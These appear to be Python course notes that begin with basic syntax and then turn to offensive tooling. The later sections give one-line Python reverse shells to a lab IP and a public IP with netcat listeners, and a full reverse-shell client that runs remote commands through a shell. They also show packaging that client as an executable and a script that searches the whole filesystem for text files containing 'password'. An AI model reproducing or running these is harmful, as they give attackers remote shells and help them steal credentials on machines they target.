# Introduction to Python and Case Study

> Python is a interpreted language


python1.py

name = "Peter";
lastname = "Mueller";
age = 31;
salery = 10000.50;
income = salery * 12;
test = "1" + "1"
test2 = '2' + '2'
mystring = "It\'s Sunnday!!!";
l=len(mystring)
print(income);
print(income-12);
print(name + " " + lastname);
print(test)
print(test2)
print(mystring);
print(l)

door_locked = True
if door_locked:
    print("door is locked")
else:
    print("door is not locked")


i = 1
while i < 5:
    print(i)
    i = i + 1

mylist = [1, 'a', "hello", 12.15]

for item in mylist:
    print(item)


for letter in "hello":
    print(letter);

def say_name (name):
    print("hi", name)

say_name("Philippe");

---------------------------------------

Execute  Python Script in Command Line
python3 python1.py

---------------------------------------

Start Webserver in current Dictionary 
sudo python3 -m http.server 88

![-parallels@kali-linux-2021-1--[~Desktop]](assets/-parallels@kali-linux-2021-1--%5B~Desktop%5D.png)



---------------------------------------

Reverse Shell to run on Target Machine

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.211.55.4",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 


Listen on my Computer that Target Machine Connect to me

nc -nlvp 4242listening on [any] 4242 ...

---------------------------------------

List all .txt on Desktop

import glob, os
os.chdir("/home/parallels/Desktop/")
for file in glob.glob("*.txt"):
    print(file)

---------------------------------------

Print all .txt files on System

import os
for root, dirs, files in os.walk("/"):
    for file in files:
        if file.endswith(".txt"):
            print(os.path.join(root, file))

---------------------------------------
Print Path of all .txt which contains 'password'

import os
for root, dirs, files in os.walk("/"):
    for file in files:
        if file.endswith(".txt"):
            with open(os.path.join(root, file)) as f:
                if 'password' in f.read():
                    print(os.path.join(root, file))


---------------------------------------
Linux Priv Checker 
https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py



---------------------------------------


Own Reverse Shell Script

import socket as socket
import subprocess as subprocess
import os as os

# Create a socket
def socket_create():
    try:
         global host
         global port
         global s
         host = "10.211.55.4"
         port = 9999
         s = socket.socket()
    except s.error as msg:
        print("Socket creation error: " + str(msg))


# Connect to remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("Socket connection error: " + str(msg))


# Receive commands from remote server and run on local machine
def receive_commands():
    global s
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[:3].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
            print(output_str)
    s.close()

def main():
    socket_create()
    socket_connect()
    receive_commands()

main()
        




---------------------------------------

Listen on my Computer that Target Machine Connect to me

nc -nlvp 9999

---------------------------------------

Create Executable (exe ? )  from Python
sudo pyinstaller --onefile reverseshell.py

---------------------------------------

Python One Line Reverse Shell

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("35.226.248.77",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


---------------------------------------

## Read sys arg

You can use sys.argv.

....

tsv_file = sys.argv[1]

xlsx_file = sys.argv[2]

...

You can run like:

main.py sample.tsv sample.xlsx